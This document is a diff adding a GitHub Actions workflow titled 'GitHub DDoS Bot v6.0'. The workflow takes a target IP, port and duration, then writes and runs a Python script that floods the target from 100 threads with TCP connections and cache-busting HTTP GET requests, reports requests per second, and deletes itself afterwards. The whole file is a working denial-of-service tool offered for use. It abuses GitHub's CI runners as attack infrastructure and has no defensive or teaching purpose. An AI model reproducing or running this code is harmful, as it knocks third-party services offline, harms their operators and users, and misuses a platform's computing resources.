@@ -1,0 +1,118 @@
+name: 🚀 GitHub DDoS Bot v6.0
+
+on:
+  workflow_dispatch:
+    inputs:
+      target:
+        description: '🎯 Target IP'
+        required: true
+        default: '1.1.1.1'
+      port:
+        description: '🔢 Port'
+        required: true
+        default: '80'
+      duration:
+        description: '⏱️ Duration (seconds)'
+        required: true
+        default: '30'
+
+jobs:
+  attack:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    
+    steps:
+    - name: 🐍 Create Attack Script
+      run: |
+        cat > attack.py << 'EOF'
+import socket
+import threading
+import time
+import random
+import sys
+
+print("🚀 GitHub DDoS Bot v6.0 Starting...")
+
+target = "${{ github.event.inputs.target }}"
+port = ${{ github.event.inputs.port }}
+duration = ${{ github.event.inputs.duration }}
+
+print(f"🎯 Target: {target}:{port}")
+print(f"⏱️ Duration: {duration}s")
+
+attack_count = 0
+start_time = time.time()
+
+def attack():
+    global attack_count
+    while time.time() < start_time + duration:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(1)
+            s.connect((target, port))
+            
+            # HTTP request
+            request = f"GET /?{random.randint(1,9999)} HTTP/1.1\r\n"
+            request += f"Host: {target}\r\n"
+            request += "User-Agent: Mozilla/5.0\r\n"
+            request += "Connection: close\r\n\r\n"
+            
+            s.send(request.encode())
+            s.close()
+            
+            attack_count += 1
+            
+            if attack_count % 100 == 0:
+                elapsed = time.time() - start_time
+                rps = attack_count / elapsed if elapsed > 0 else 0
+                print(f"📊 Requests: {attack_count:,} | RPS: {rps:.0f}")
+                
+        except:
+            pass
+
+# Start 100 threads
+threads = []
+for i in range(100):
+    t = threading.Thread(target=attack)
+    t.start()
+    threads.append(t)
+
+# Wait for duration
+time.sleep(duration)
+
+# Stop all threads
+for t in threads:
+    t.join(timeout=1)
+
+# Final report
+total_time = time.time() - start_time
+avg_rps = attack_count / total_time if total_time > 0 else 0
+
+print(f"\n{'='*40}")
+print(f"✅ ATTACK COMPLETE!")
+print(f"{'='*40}")
+print(f"🎯 Target: {target}:{port}")
+print(f"⏱️ Duration: {total_time:.1f}s")
+print(f"📨 Requests: {attack_count:,}")
+print(f"⚡ Average RPS: {avg_rps:.0f}")
+print(f"🔥 Estimated Bandwidth: {avg_rps * 1000 / 1000:.1f} Mbps")
+print(f"{'='*40}")
+        EOF
+        
+        echo "🤖 Script created"
+    
+    - name: ⚡ Run Attack
+      run: python3 attack.py
+    
+    - name: 📊 Generate Report
+      run: |
+        echo "\n📋 GitHub DDoS Bot Report"
+        echo "=========================="
+        echo "User: ${{ github.actor }}"
+        echo "Repo: ${{ github.repository }}"
+        echo "Time: $(date)"
+        echo "Status: ✅ Success"
+        echo "=========================="
+    
+    - name: 🧹 Cleanup
+      run: rm -f attack.py
